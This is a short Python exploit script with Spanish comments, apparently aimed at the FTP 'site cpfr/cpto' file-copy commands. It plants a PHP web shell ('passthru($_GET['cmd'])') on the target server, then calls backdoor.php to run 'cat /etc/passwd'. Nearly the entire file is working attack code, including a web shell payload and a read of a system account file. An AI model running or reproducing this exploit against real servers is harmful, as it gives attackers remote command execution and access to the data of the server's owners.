import socket#Conexiones cliente - servidor
import requests
class Exploit:
    #Le pasamos como argumento al host, al puerto, a la direccion
    def __init__(self,host,port,path):
        self.host = host# Dirección IP o dominio del servidor
        self.port = port# Puerto del servidor
        self.path = path# Ruta de destino donde se copiará el archivo
        self.sock = None# Variable para la conexión de red

    def connect(self):
        try:
            self.sock = socket.create_connection((self.host,self.port))
            self.sock.recv(1024)
            return True
        except Exception as e:
            print("Error al conectarse a {self.host} en el puerto {self.port}: {e}")
            return False
        
    def send_command(self,command):
        try:
            #Mensaje que queremos enviar al servidor 
            self.sock.sendall(command.encode('utf-8'))
            #Respuesta del servidor 
            return self.sock.recv(1024).decode('utf-8')
        except Exception as e:
            print(f"Error al enviar el comando {command}: {e}")
            return None

    def exploit(self):
        # Define un payload PHP para ejecutar comandos desde la URL.
        payload = "<?php echo passthru($_GET['cmd']); ?>"

        # Lee el archivo /proc/self/cmdline para verificar la configuración del servidor.
        self.send_command(f"site cpfr /proc/self/cmdline\n")

        # Sube el payload PHP al directorio temporal (/tmp).
        self.send_command(f"site cpto /tmp/.{payload}\n")

        # Verifica que el payload se haya subido correctamente.
        self.send_command(f"site cpfr /tmp/.{payload}\n")

        # Mueve el payload a la ruta de destino especificada.
        respuesta = self.send_command(f"site cpto {self.path}\n")

        if "Copy successful" in respuesta :
            print("La explotacion ha tenido exito")
        else:
            print(f"La explotación ha fallado:{respuesta}")


    def trigger(self):
        try:
            response = requests.get(f"http://{self.host}/backdoor.php?cmd=cat /etc/passwd")
            if response.status_code==200:
                return response.text
            return f"Error al ejecutar el exploit: {response.text}"
        except Exception as e:
            return f"Error en la solicitud HTTP: {e}"
        
    def run(self):
        if self.connect():
            self.exploit()